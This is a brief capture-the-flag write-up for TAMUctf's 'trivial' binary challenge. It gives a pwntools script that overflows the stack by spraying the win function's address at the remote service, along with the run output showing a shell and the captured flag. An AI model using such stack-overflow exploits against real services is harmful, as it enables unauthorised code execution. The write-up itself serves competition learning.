## Question 

Author: Lane
Attack the server and get the flag!
SNI: trivial

[trivial](trivial)

## Solution

Just sprayed the address of the win function across the stack. 

```python
from pwn import *

e = context.binary = ELF(args.BIN)

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
win = p64(e.sym['win'])

p.sendline(win*100)
p.interactive()
```

Running it returns the flag

```
$python3 pwn-trivial.py BIN=./trivial
[*] '/root/workspace/tamu-ctf/trivial/trivial'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tamuctf.com on port 443: Done
[*] Switching to interactive mode
$ cat flag.txt
gigem{sorry_for_using_the_word_trivial}
```